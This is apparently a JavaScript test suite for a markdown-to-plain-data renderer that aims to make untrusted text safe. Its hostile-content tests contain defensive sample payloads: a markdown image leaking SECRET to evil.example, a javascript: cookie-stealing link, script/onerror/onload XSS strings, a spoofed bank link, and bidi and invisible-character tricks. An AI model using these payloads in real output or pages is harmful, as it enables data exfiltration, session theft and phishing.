import test from 'node:test';
import assert from 'node:assert/strict';
import { parseSafeText, toPlainText, stripUnsafeChars, DEFAULT_MAX_CHARS } from '../src/render/safeText.js';
import { cpuTime } from './fixtures/timing.js';

// Invisible characters are built from code points so this file itself stays plain ASCII.
const cp = (...codes) => String.fromCodePoint(...codes);

const BLOCK_TYPES = new Set(['paragraph', 'heading', 'list', 'quote', 'code', 'rule']);
const INLINE_TYPES = new Set(['text', 'bold', 'italic', 'code', 'url']);

const textOf = (inlines) => inlines.map((x) => x.text).join('');
const parse = (t, o) => parseSafeText(t, o);
const para = (t) => textOf(parse(t)[0].inlines);

// Every block and inline has a known type and only plain data fields; nothing resembles markup or a link target.
function assertPlainData(blocks, depth = 0) {
  assert.ok(Array.isArray(blocks));
  assert.ok(depth < 12, 'nesting stays bounded');
  for (const b of blocks) {
    assert.ok(BLOCK_TYPES.has(b.type), `block type ${b.type}`);
    for (const key of Object.keys(b)) assert.ok(!/html|href|src|url$/i.test(key), `no field named ${key}`);
    const inlines = (list) => {
      for (const x of list) {
        assert.ok(INLINE_TYPES.has(x.type), `inline type ${x.type}`);
        assert.equal(typeof x.text, 'string');
        assert.deepEqual(Object.keys(x).sort(), ['text', 'type']);
      }
    };
    if (b.inlines) inlines(b.inlines);
    if (b.type === 'list') {
      for (const it of b.items) {
        inlines(it.inlines);
        assertPlainData(it.children, depth + 1);
      }
    }
    if (b.type === 'quote') assertPlainData(b.blocks, depth + 1);
  }
}

function maxDepth(blocks) {
  let deepest = 0;
  for (const b of blocks) {
    if (b.type === 'list') for (const it of b.items) deepest = Math.max(deepest, 1 + maxDepth(it.children));
    if (b.type === 'quote') deepest = Math.max(deepest, 1 + maxDepth(b.blocks));
  }
  return deepest;
}

// ---- Structure -----------------------------------------------------------------------------------------------------

test('paragraphs split on blank lines and keep single line breaks', () => {
  const blocks = parse('First line\nsecond line\n\n\nNext paragraph');
  assert.equal(blocks.length, 2);
  assert.equal(blocks[0].type, 'paragraph');
  assert.equal(textOf(blocks[0].inlines), 'First line\nsecond line');
  assert.equal(textOf(blocks[1].inlines), 'Next paragraph');
});

test('headings: levels 1-3, deeper levels clamp to 3, closing hashes drop, #tag is not a heading', () => {
  const blocks = parse('# One\n## Two ##\n### Three\n#### Four\n###### Six\n#hashtag\n####### seven');
  assert.deepEqual(
    blocks.slice(0, 5).map((b) => [b.type, b.level, textOf(b.inlines)]),
    [
      ['heading', 1, 'One'],
      ['heading', 2, 'Two'],
      ['heading', 3, 'Three'],
      ['heading', 3, 'Four'],
      ['heading', 3, 'Six'],
    ]
  );
  assert.equal(blocks[5].type, 'paragraph');
  assert.equal(textOf(blocks[5].inlines), '#hashtag\n####### seven');
});

test('bullet and numbered lists, with the start number kept', () => {
  const [bullets, numbers] = parse('- one\n* two\n+ three\n\n3. third\n4. fourth\n5) fifth');
  assert.equal(bullets.type, 'list');
  assert.equal(bullets.ordered, false);
  assert.deepEqual(bullets.items.map((i) => textOf(i.inlines)), ['one', 'two', 'three']);
  assert.equal(numbers.ordered, true);
  assert.equal(numbers.start, 3);
  assert.deepEqual(numbers.items.map((i) => textOf(i.inlines)), ['third', 'fourth', 'fifth']);
});

test('task items carry checked state; plain items have null', () => {
  const [list] = parse('- [ ] open\n- [x] done\n- [X] done too\n- [ ]not a task\n- plain');
  assert.deepEqual(list.items.map((i) => i.checked), [false, true, true, null, null]);
  assert.equal(textOf(list.items[0].inlines), 'open');
  assert.equal(textOf(list.items[3].inlines), '[ ]not a task');
});

test('nested lists by indentation (two and four spaces), mixed kinds', () => {
  const blocks = parse('- top\n  - child a\n  - child b\n    1. grand one\n    2. grand two\n- second top\n    - four space child');
  assert.equal(blocks.length, 1);
  const top = blocks[0].items;
  assert.equal(top.length, 2);
  const child = top[0].children[0];
  assert.equal(child.type, 'list');
  assert.deepEqual(child.items.map((i) => textOf(i.inlines)), ['child a', 'child b']);
  const grand = child.items[1].children[0];
  assert.equal(grand.ordered, true);
  assert.deepEqual(grand.items.map((i) => textOf(i.inlines)), ['grand one', 'grand two']);
  assert.equal(textOf(top[1].children[0].items[0].inlines), 'four space child');
  assertPlainData(blocks);
});

test('numbered step with an indented code block and a follow-up paragraph stays inside the item', () => {
  const blocks = parse('1. Run this:\n\n   ```sh\n   npm test\n   ```\n\n   Then check the output.\n2. Done');
  assert.equal(blocks.length, 1);
  const [first, second] = blocks[0].items;
  assert.equal(textOf(first.inlines), 'Run this:');
  assert.deepEqual(first.children.map((c) => c.type), ['code', 'paragraph']);
  assert.equal(first.children[0].text, 'npm test');
  assert.equal(first.children[0].lang, 'sh');
  assert.equal(textOf(second.inlines), 'Done');
});

test('a list item continues on an unindented line (lazy continuation) and a heading ends the list', () => {
  const blocks = parse('- one\ncontinues here\n- two\n# After');
  assert.equal(blocks[0].items.length, 2);
  assert.equal(textOf(blocks[0].items[0].inlines), 'one\ncontinues here');
  assert.equal(blocks[1].type, 'heading');
});

test('a numbered line only interrupts a paragraph when it starts at 1', () => {
  assert.equal(parse('released in\n2024. Things happened').length, 1);
  assert.equal(parse('Steps:\n1. first').length, 2);
});

test('block quotes: multi-line, with inner formatting and an inner list', () => {
  const [quote] = parse('> **Note:** careful\n> second line\n>\n> - a\n> - b');
  assert.equal(quote.type, 'quote');
  assert.deepEqual(quote.blocks.map((b) => b.type), ['paragraph', 'list']);
  assert.equal(quote.blocks[0].inlines[0].type, 'bold');
  assert.equal(quote.blocks[1].items.length, 2);
});

test('horizontal rule is a plain rule block; a dash list is not mistaken for one', () => {
  assert.deepEqual(parse('---').map((b) => b.type), ['rule']);
  assert.deepEqual(parse('* * *').map((b) => b.type), ['rule']);
  assert.deepEqual(parse('- - a').map((b) => b.type), ['list']);
  assert.deepEqual(parse('-5 degrees').map((b) => b.type), ['paragraph']);
});

// ---- Code ----------------------------------------------------------------------------------------------------------

test('fenced code is kept verbatim and not parsed (tilde fences, language tag)', () => {
  const blocks = parse('```javascript\nconst a = **b** + [c](https://x.example);\n# not a heading\n```\n\n~~~\nplain\n~~~');
  assert.deepEqual(blocks.map((b) => b.type), ['code', 'code']);
  assert.equal(blocks[0].lang, 'javascript');
  assert.equal(blocks[0].text, 'const a = **b** + [c](https://x.example);\n# not a heading');
  assert.equal(blocks[1].lang, '');
});

test('a fence info string with odd characters never becomes a language', () => {
  const [code] = parse('```"><svg onload=alert(1)>\nx\n```');
  assert.equal(code.type, 'code');
  assert.equal(code.lang, '');
});

test('an unterminated fence runs to the end of the text and does not throw', () => {
  const blocks = parse('before\n\n```js\nline one\n- not a list\n\n[x](y)');
  assert.deepEqual(blocks.map((b) => b.type), ['paragraph', 'code']);
  assert.equal(blocks[1].text, 'line one\n- not a list\n\n[x](y)');
  assert.deepEqual(parse('```').map((b) => b.type), ['code']);
  assert.equal(parse('````\n```\nstill code').length, 1, 'a shorter fence inside a longer one is content');
});

test('backticks on one line are inline code, not a fence', () => {
  const [p] = parse('```inline``` text');
  assert.equal(p.type, 'paragraph');
  assert.equal(p.inlines[0].type, 'code');
});

// ---- Inline --------------------------------------------------------------------------------------------------------

test('bold, italic and code inline', () => {
  const [p] = parse('a **bold** b *it* c `x * y` d');
  assert.deepEqual(p.inlines, [
    { type: 'text', text: 'a ' },
    { type: 'bold', text: 'bold' },
    { type: 'text', text: ' b ' },
    { type: 'italic', text: 'it' },
    { type: 'text', text: ' c ' },
    { type: 'code', text: 'x * y' },
    { type: 'text', text: ' d' },
  ]);
});

test('code inside bold keeps both; double backticks hold a backtick', () => {
  const [p] = parse('**run `ls` now** and ``a ` b``');
  assert.deepEqual(p.inlines.map((x) => [x.type, x.text]), [['bold', 'run '], ['code', 'ls'], ['bold', ' now'], ['text', ' and '], ['code', 'a ` b']]);
});

test('lone markers stay literal: math, snake_case, unclosed bold, spaced stars', () => {
  assert.equal(para('2 * 3 * 4'), '2 * 3 * 4');
  assert.equal(para('use caller_id and sys_updated_on'), 'use caller_id and sys_updated_on');
  assert.equal(para('**never closed'), '**never closed');
  assert.equal(para('a ** b ** c'), 'a ** b ** c');
  assert.equal(para('stray `tick'), 'stray `tick');
  assert.ok(parse('2 * 3 * 4')[0].inlines.every((x) => x.type === 'text'));
});

test('bare http(s) urls are url inlines without trailing punctuation; other schemes stay text', () => {
  const [p] = parse('see https://a.example/x?y=1, then (http://b.example/z) and ftp://c.example and javascript:alert(1).');
  const urls = p.inlines.filter((x) => x.type === 'url').map((x) => x.text);
  assert.deepEqual(urls, ['https://a.example/x?y=1', 'http://b.example/z']);
  assert.ok(textOf(p.inlines).includes('javascript:alert(1)'));
  assert.ok(p.inlines.filter((x) => x.type === 'url').every((x) => /^https?:\/\//.test(x.text)));
});

// ---- Hostile content -----------------------------------------------------------------------------------------------

test('markdown image exfiltration becomes visible text and the address is dropped', () => {
  const blocks = parse('Summary ![x](https://evil.example/?q=SECRET) done');
  assertPlainData(blocks);
  const json = JSON.stringify(blocks);
  assert.equal(textOf(blocks[0].inlines), 'Summary [image removed: x] done');
  assert.ok(!json.includes('evil.example'));
  assert.ok(!json.includes('SECRET'));
  assert.ok(blocks[0].inlines.every((x) => x.type === 'text'));
});

test('image variants: no alt, title, spaces, angle brackets, nested brackets, multi-line', () => {
  assert.equal(para('![](https://e.example/a.png)'), '[image removed]');
  assert.equal(para('![alt](https://e.example/a.png "title")'), '[image removed: alt]');
  assert.equal(para('![alt]( https://e.example/a.png )'), '[image removed: alt]');
  assert.equal(para('![alt](<https://e.example/a b.png>)'), '[image removed: alt]');
  assert.equal(para('![a [b] c](https://e.example/a.png)'), '[image removed: a b c]');
  assert.equal(para('![**bold** alt](https://e.example/a.png)'), '[image removed: bold alt]');
  for (const t of ['![x](https://e.example/a.png)', '![x](https://e.example/a.png "t")', '![x]( https://e.example/a.png )']) {
    const json = JSON.stringify(parse(t));
    assert.ok(!json.includes('e.example'), t);
  }
});

test('image-like syntax that does not parse is only ever text (reference style, broken)', () => {
  const blocks = parse('![x][ref]\n\n[ref]: https://evil.example/?q=SECRET\n\n![x](https://evil.example/?q=SECRET');
  assertPlainData(blocks);
  for (const b of blocks) assert.ok(b.inlines.every((x) => x.type === 'text' || x.type === 'url'));
});

test('links never load: label then the address shown as url text', () => {
  const [p] = parse('Open [the docs](https://docs.example/start "Docs") now');
  assert.deepEqual(p.inlines, [
    { type: 'text', text: 'Open the docs (' },
    { type: 'url', text: 'https://docs.example/start' },
    { type: 'text', text: ') now' },
  ]);
});

test('a javascript: link is shown as text, never as something clickable', () => {
  const blocks = parse('[click me](javascript:alert(document.cookie)) and [data](data:text/html;base64,PHNjcmlwdD4=)');
  assertPlainData(blocks);
  const text = textOf(blocks[0].inlines);
  assert.ok(text.includes('click me (javascript:alert(document.cookie))'));
  assert.ok(text.includes('data (data:text/html;base64,PHNjcmlwdD4=)'));
});

test('a link whose label looks like another address shows both addresses', () => {
  const [p] = parse('[https://bank.example/login](https://evil.example/steal)');
  const urls = textOf(p.inlines);
  assert.ok(urls.includes('https://bank.example/login'));
  assert.ok(urls.includes('https://evil.example/steal'));
  assert.deepEqual(parse('[https://same.example](https://same.example)')[0].inlines, [{ type: 'url', text: 'https://same.example' }]);
});

test('raw html is plain text, byte for byte', () => {
  const html = '<script>alert(1)</script><img src=x onerror=alert(1)><a href="javascript:x">y</a><svg onload=alert(1)>';
  const blocks = parse(html);
  assertPlainData(blocks);
  assert.equal(blocks.length, 1);
  assert.equal(textOf(blocks[0].inlines), html);
  assert.ok(blocks[0].inlines.every((x) => x.type === 'text'));
  const inCode = parse('```html\n<script>alert(1)</script>\n```')[0];
  assert.equal(inCode.text, '<script>alert(1)</script>');
});

test('control characters are removed, tab and newline kept, line endings normalised', () => {
  const dirty = `a${cp(0)}b${cp(7)}c${cp(0x7f)}d${cp(0x85)}e\tf\r\ng\rh${cp(0x2028)}i`;
  const clean = stripUnsafeChars(dirty);
  assert.equal(clean, 'abcd\ne\tf\ng\nh\ni');
});

test('bidi overrides, isolates and marks are removed', () => {
  const bidi = [0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200e, 0x200f, 0x061c];
  for (const c of bidi) {
    const blocks = parse(`pay${cp(c)}fdp.exe`);
    assert.equal(para(`pay${cp(c)}fdp.exe`), 'payfdp.exe', `U+${c.toString(16)}`);
    assert.ok(!JSON.stringify(blocks).includes(cp(c)));
  }
  assert.equal(para(`${cp(0x202e)}gpj.exe`), 'gpj.exe');
});

test('zero-width and other invisible characters are removed', () => {
  const invisible = [0x200b, 0x200c, 0x200d, 0x2060, 0x2061, 0xfeff, 0x00ad, 0x034f, 0x180e, 0x3164, 0xffa0, 0x206a, 0xfe00, 0xfff9];
  for (const c of invisible) assert.equal(para(`ad${cp(c)}min`), 'admin', `U+${c.toString(16)}`);
  // Unicode tag characters (used to hide text) and variation selector supplement go too.
  const hidden = cp(0xe0041, 0xe0042, 0xe0100);
  assert.equal(para(`visible${hidden}text`), 'visibletext');
  // A hidden character cannot be used to split a marker so it escapes detection, or to join one together.
  const [p] = parse(`**bo${cp(0x200b)}ld**`);
  assert.deepEqual(p.inlines, [{ type: 'bold', text: 'bold' }]);
});

test('emoji sequences keep their joiners and variation selector; odd spaces become spaces', () => {
  const family = cp(0x1f469, 0x200d, 0x1f4bb);
  assert.equal(para(`dev ${family} here`), `dev ${family} here`);
  assert.equal(para(`heart${cp(0x2764, 0xfe0f)}`), `heart${cp(0x2764, 0xfe0f)}`);
  assert.equal(para(`a${cp(0xa0)}b${cp(0x2003)}c${cp(0x3000)}d`), 'a b c d');
  assert.equal(para(`a${cp(0x200d)}${cp(0x200d)}b`), 'ab');
  assert.equal(para(`${cp(0x1f469)}${cp(0x200d)}x`), `${cp(0x1f469)}x`);
});

test('lone surrogates become the replacement character', () => {
  const text = para(`a${String.fromCharCode(0xd83d)}b${String.fromCharCode(0xdc00)}c`);
  assert.equal(text, `a${cp(0xfffd)}b${cp(0xfffd)}c`);
});

test('non-string input never throws', () => {
  for (const v of [null, undefined, 42, true, {}, [], ['a', 'b'], () => 1, Symbol.iterator]) {
    if (typeof v === 'symbol') continue;
    assert.ok(Array.isArray(parse(v)), String(v));
  }
  const nasty = { toString() { throw new Error('boom'); } };
  assert.deepEqual(parse(nasty), []);
  assert.deepEqual(parse(''), []);
  assert.deepEqual(parse('   \n\n  '), []);
  assert.deepEqual(parse(null), []);
});

// ---- Limits --------------------------------------------------------------------------------------------------------

test('input over the cap is cut and says so', () => {
  const blocks = parse('word '.repeat(40000));
  assert.ok(blocks.length >= 2);
  const last = blocks[blocks.length - 1];
  assert.equal(last.truncated, true);
  assert.match(textOf(last.inlines), /truncated/i);
  const shown = blocks.slice(0, -1).map((b) => textOf(b.inlines)).join('');
  assert.ok(shown.length <= DEFAULT_MAX_CHARS);
  assert.equal(DEFAULT_MAX_CHARS, 60000);
  assert.ok(!parse('short')[0].truncated);
});

test('maxChars option, cut surrogate pairs do not leave half an emoji', () => {
  const blocks = parse('abcdef', { maxChars: 3 });
  assert.equal(textOf(blocks[0].inlines), 'abc');
  assert.equal(blocks[1].truncated, true);
  const cut = parse(`ab${cp(0x1f600)}`, { maxChars: 3 });
  assert.equal(textOf(cut[0].inlines), `ab${cp(0xfffd)}`);
  assert.deepEqual(parse('abc', { maxChars: 0 }).map((b) => !!b.truncated), [true]);
});

test('nesting is capped: lists and quotes beyond the limit become plain text', () => {
  let deepList = '';
  for (let i = 0; i < 40; i++) deepList += `${'  '.repeat(i)}- level ${i}\n`;
  const blocks = parse(deepList);
  assertPlainData(blocks);
  assert.ok(maxDepth(blocks) <= 4, `list depth ${maxDepth(blocks)}`);
  const deepQuote = parse(`${'>'.repeat(40)} deep`);
  assert.ok(maxDepth(deepQuote) <= 4);
  assert.ok(textOf(deepQuote[0].blocks[0].blocks[0].blocks[0].blocks[0].inlines).includes('>'));
  assert.ok(maxDepth(parse(deepList, { maxDepth: 1 })) <= 1);
  assert.ok(maxDepth(parse(deepList, { maxDepth: 999 })) <= 8, 'the option itself is capped');
  assert.deepEqual(parse('- a', { maxDepth: 0 }).map((b) => b.type), ['paragraph']);
});

// ---- Speed ---------------------------------------------------------------------------------------------------------

function repeatTo(unit, size) {
  return unit.repeat(Math.ceil(size / unit.length)).slice(0, size);
}

function growingIndent(size) {
  let out = '';
  for (let i = 0; out.length < size; i++) out += `${' '.repeat(i % 600)}- item ${i}\n`;
  return out.slice(0, size);
}

const SIZE = 300000;
const ADVERSARIAL = {
  'open brackets': repeatTo('[', SIZE),
  'empty links': repeatTo('[](', SIZE),
  'links without close': repeatTo('[a](b ', SIZE),
  'images without close': repeatTo('![a](', SIZE),
  'bracket then long url': `[x](${'a'.repeat(SIZE)}`,
  'many open brackets then one link': `${'['.repeat(SIZE / 2)}x](${'a'.repeat(100)})`,
  'nested parens': `[x]${'('.repeat(SIZE)}`,
  'backticks of every length': Array.from({ length: 700 }, (_, i) => '`'.repeat(i + 1) + 'a').join(' ').slice(0, SIZE),
  'single backticks': repeatTo('`a', SIZE),
  'unclosed bold': repeatTo('**a ', SIZE),
  'unclosed italic': repeatTo('*a ', SIZE),
  'stars': repeatTo('*', SIZE),
  'bare urls': repeatTo('http://', SIZE),
  'one huge url': `https://${'a'.repeat(SIZE)}`,
  'quotes': repeatTo('>', SIZE),
  'quote lines': repeatTo('> a\n', SIZE),
  'bullets': repeatTo('- a\n', SIZE),
  'bullets with blank lines': repeatTo('- a\n\n', SIZE),
  'dashes': repeatTo('- ', SIZE),
  'numbers': repeatTo('1. ', SIZE),
  'growing indent': growingIndent(SIZE),
  'tasks': repeatTo('- [ ] ', SIZE),
  'fences': repeatTo('```\n', SIZE),
  'fences with text': repeatTo('```js\ncode\n', SIZE),
  'headings': repeatTo('# a\n', SIZE),
  'hash run': repeatTo('#', SIZE),
  'rules': repeatTo('---\n', SIZE),
  'blank lines': repeatTo('\n', SIZE),
  'spaces': repeatTo(' ', SIZE),
  'one long word': repeatTo('a', SIZE),
  'bidi characters': repeatTo(cp(0x202e), SIZE),
  'lone surrogates': repeatTo(String.fromCharCode(0xd800), SIZE),
  'zero joiners': repeatTo(cp(0x1f600, 0x200d), SIZE),
  'mixed junk': repeatTo('**[`!>- 1. #\n  http://', SIZE),
};

for (const [name, input] of Object.entries(ADVERSARIAL)) {
  test(`300k characters of "${name}" parse in under 500 ms`, () => {
    // Both the default cap and a cap high enough that the whole input is parsed. CPU time, warm, best of three (tests/fixtures/timing.js):
    // the whole suite runs at once, and the clock also counts the time other test processes had the CPU.
    for (const options of [undefined, { maxChars: 1000000 }]) {
      const { ms, value: blocks } = cpuTime(() => parse(input, options), 500);
      assert.ok(ms < 500, `${name}: ${Math.round(ms)} ms of CPU`);
      assertPlainData(blocks);
    }
  });
}

// ---- Plain text for Copy -------------------------------------------------------------------------------------------

test('toPlainText: no markdown noise except list markers', () => {
  const md = [
    '# Title',
    '',
    'Some **bold**, *italic* and `code` with [a link](https://a.example/x) and ![pic](https://e.example/p.png).',
    '',
    '- [ ] open',
    '- [x] done',
    '  - nested',
    '',
    '3. third',
    '4. fourth',
    '',
    '> quoted text',
    '',
    '```js',
    'const a = 1;',
    '```',
    '',
    '---',
    'end',
  ].join('\n');
  const plain = toPlainText(parse(md));
  assert.equal(
    plain,
    [
      'Title',
      '',
      'Some bold, italic and code with a link (https://a.example/x) and [image removed: pic].',
      '',
      '- [ ] open',
      '- [x] done',
      '  - nested',
      '',
      '3. third',
      '4. fourth',
      '',
      'quoted text',
      '',
      'const a = 1;',
      '',
      'end',
    ].join('\n')
  );
  for (const noise of ['**', '```', '# ', '![', '](', '> ']) assert.ok(!plain.includes(noise), noise);
});

test('toPlainText accepts raw text, skips the truncation notice, and survives junk blocks', () => {
  assert.equal(toPlainText('**hi** there'), 'hi there');
  assert.equal(toPlainText(parse('abcdef', { maxChars: 3 })), 'abc');
  assert.equal(toPlainText(null), '');
  assert.equal(toPlainText([null, 5, { type: 'nope' }, { type: 'list', items: [null, { inlines: [{ type: 'text', text: 'x' }] }] }]), '- x');
  assert.equal(toPlainText([{ type: 'list', ordered: true, start: 9, items: [{ checked: null, inlines: [{ type: 'text', text: 'nine' }], children: [] }, { checked: null, inlines: [{ type: 'text', text: 'ten' }], children: [{ type: 'paragraph', inlines: [{ type: 'text', text: 'more' }] }] }] }]), '9. nine\n10. ten\n    more');
});
